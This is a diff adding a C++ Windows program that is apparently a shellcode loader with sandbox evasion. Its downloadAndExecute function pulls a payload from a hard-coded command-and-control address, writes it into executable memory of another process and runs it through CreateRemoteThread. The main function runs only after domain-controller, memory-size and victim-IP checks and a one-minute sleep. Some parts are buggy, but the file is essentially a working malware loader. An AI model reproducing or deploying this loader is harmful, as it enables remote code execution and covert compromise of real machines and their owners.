@@ -1,0 +1,110 @@
+#include <iostream>
+#include <Windows.h>
+#include <tlhelp32.h>
+#include <locale>
+#include <string>
+#include <urlmon.h>
+#include <cstdio>
+#include <lm.h>
+#include <DsGetDC.h>
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "netapi32.lib")
+
+
+using namespace std;
+
+int downloadAndExecute()
+{
+    HANDLE hProcess;
+    SIZE_T dwSize = 510;
+    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
+    DWORD flProtect = PAGE_EXECUTE_READWRITE;
+    LPVOID memAddr;
+    SIZE_T bytesOut;
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 924);
+    const char* c2URL = "http://10.8.10.18/index.raw";
+    IStream* stream;
+    char buff[510];
+    unsigned long bytesRead;
+    string s;
+    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
+    while (true) {
+        stream->Read(buff, 510, &bytesRead);
+        if (0U == bytesRead) {
+            break;
+        }
+        s.append(buff, bytesRead);
+    }
+    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
+
+    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
+
+    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
+    stream->Release();
+    return 0;
+}
+
+BOOL isDomainController() {
+    LPCWSTR dcName;
+    string dcNameComp;
+    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
+    wstring ws(dcName);
+    string dcNewName(ws.begin(), ws.end());
+    cout << dcNewName;
+    if (dcNewName.find("\\")) {
+        return FALSE;
+
+    }
+    else {
+        return TRUE;
+    }
+}
+
+BOOL memoryCheck() {
+    MEMORYSTATUSEX statex;
+    statex.dwLength = sizeof(statex);
+    GlobalMemoryStatusEx(&statex);
+    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 1.00) {
+        return TRUE;
+    }
+    else {
+        return FALSE;
+    }
+}
+
+BOOL checkIP()
+{
+    const char* websiteURL = "https://ifconfig.me/HostIP";
+    IStream* stream;
+    string s;
+    char buff[35];
+    unsigned long bytesRead;
+    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
+    while (true) {
+        stream->Read(buff, 35, &bytesRead);
+        if (0U == bytesRead) {
+            break;
+        }
+        s.append(buff, bytesRead);
+    }
+    if (s == "Victim IP") {
+        return TRUE;
+    }
+    else {
+        return FALSE;
+    }
+}
+
+
+int main() {
+    if (isDomainController() == TRUE) {
+        if (memoryCheck() == TRUE)
+        {
+            if (checkIP() == TRUE) {
+                Sleep(60000);
+                downloadAndExecute();
+            }
+        }
+    }
+    return 0;
+}
